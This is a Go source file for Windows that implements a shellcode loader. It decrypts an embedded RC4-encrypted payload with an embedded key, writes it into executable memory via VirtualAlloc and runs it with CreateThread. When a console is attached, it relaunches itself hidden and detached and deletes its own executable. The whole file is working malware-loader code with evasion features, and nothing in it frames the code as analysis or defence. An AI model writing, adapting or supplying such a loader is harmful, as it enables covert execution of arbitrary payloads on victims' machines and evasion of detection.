//go:build windows
// +build windows

package exec

import (
	"crypto/rc4"
	_ "embed"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"syscall"
	"time"
	"unsafe"
)

// ==============================
// Embedded shellcode + key
// ==============================

//go:embed loader_encrypted.bin
var encryptedShellcode []byte

//go:embed key.txt
var rc4Key []byte

var (
	kernel32                = syscall.NewLazyDLL("kernel32.dll")
	procVirtualAlloc        = kernel32.NewProc("VirtualAlloc")
	procCreateThread        = kernel32.NewProc("CreateThread")
	procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
	procGetConsoleWindow    = kernel32.NewProc("GetConsoleWindow")
)

const (
	MEM_COMMIT               = 0x1000
	MEM_RESERVE              = 0x2000
	PAGE_EXECUTE_READWRITE   = 0x40
	INFINITE                 = 0xFFFFFFFF
	CREATE_NEW_PROCESS_GROUP = 0x00000200
	DETACHED_PROCESS         = 0x00000008
)

func Decrypt() ([]byte, error) {
	c, err := rc4.NewCipher(rc4Key)
	if err != nil {
		return nil, fmt.Errorf("rc4 init failed: %w", err)
	}
	if len(encryptedShellcode) == 0 {
		return nil, errors.New("no embedded shellcode")
	}
	dec := make([]byte, len(encryptedShellcode))
	c.XORKeyStream(dec, encryptedShellcode)
	return dec, nil
}

func Execute(sc []byte) error {
	if attachedToConsole() {
		// Relaunch as detached, no flags!
		exe, _ := os.Executable()
		cmd := exec.Command(exe)
		cmd.SysProcAttr = &syscall.SysProcAttr{
			CreationFlags: CREATE_NEW_PROCESS_GROUP | DETACHED_PROCESS,
			HideWindow:    true,
		}
		err := cmd.Start()
		if err != nil {
			return fmt.Errorf("detach failed: %w", err)
		}
		// Optionally self-delete (delete .exe from disk after spawn)
		go func() {
			time.Sleep(2 * time.Second)
			os.Remove(exe)
		}()
		os.Exit(0)
	}

	// Detached: run as usual (no console, no flag!)
	if len(sc) == 0 {
		return errors.New("no shellcode to execute")
	}
	addr, _, _ := procVirtualAlloc.Call(
		0,
		uintptr(len(sc)),
		MEM_COMMIT|MEM_RESERVE,
		PAGE_EXECUTE_READWRITE,
	)
	if addr == 0 {
		return errors.New("VirtualAlloc failed")
	}
	dst := (*[1 << 30]byte)(unsafe.Pointer(addr))
	copy(dst[:len(sc):len(sc)], sc)

	hThread, _, _ := procCreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)
	if hThread == 0 {
		return errors.New("CreateThread failed")
	}
	procWaitForSingleObject.Call(hThread, INFINITE)
	return nil
}

// Check if process is attached to a console (parent shell/terminal)
func attachedToConsole() bool {
	hwnd, _, _ := procGetConsoleWindow.Call()
	return hwnd != 0
}
